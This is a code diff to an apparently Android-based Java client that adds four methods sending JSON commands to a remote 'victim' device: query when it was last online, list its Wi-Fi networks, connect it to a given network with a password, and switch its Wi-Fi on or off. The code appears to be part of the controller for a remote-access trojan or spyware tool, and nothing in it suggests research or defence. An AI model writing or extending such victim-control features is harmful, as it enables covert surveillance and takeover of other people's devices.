@@ -164,6 +164,37 @@ public class NettyClient extends AsyncTask<String, String, String> {
         queryHandler.sendMessage(query);
     }
 
+    public void sendGetLastOnline(String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.last.online");
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendGetWifiList(String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.wifi.list");
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendWifiConnect(String ssid, String password, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "wifi.connect");
+        query.put("ssid", ssid);
+        query.put("password", password);
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendSetWifiEnabled(boolean enabled, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "set.wifi.enabled");
+        query.put("enabled", enabled);
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
     public void sendErrorCode(String code) {
         JSONObject query = new JSONObject();
         query.put("errorCode", code);
